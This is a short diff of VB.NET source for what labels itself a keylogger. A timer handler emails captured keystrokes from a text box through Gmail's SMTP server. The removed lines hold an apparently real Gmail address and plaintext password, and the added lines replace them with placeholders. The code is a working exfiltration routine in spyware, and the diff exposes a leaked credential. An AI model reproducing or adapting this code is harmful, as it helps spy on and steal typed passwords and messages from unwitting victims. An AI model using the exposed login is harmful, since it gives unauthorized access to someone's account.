@@ -2787,13 +2787,13 @@ Public Class UserControl1
     Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
         Dim mail As New MailMessage()
         Dim SmtpServer As New SmtpClient
-        SmtpServer.Credentials = New Net.NetworkCredential("furkanfbr@gmail.com", "8989323846q")
+                    SmtpServer.Credentials = New Net.NetworkCredential("mail@gmail.com", "password")
         SmtpServer.Port = 587
         SmtpServer.Host = "smtp.gmail.com"
         SmtpServer.EnableSsl = True
         SmtpServer.EnableSsl = True
-        mail.To.Add("furkanfbr@gmail.com")
-        mail.From = New MailAddress("furkanfbr@gmail.com")
+        mail.To.Add("mail@gmail.com")
+        mail.From = New MailAddress("mail@gmail.com")
         mail.Subject = "Keylogger"
         mail.Body = RichTextBox1.Text
         SmtpServer.Send(mail)
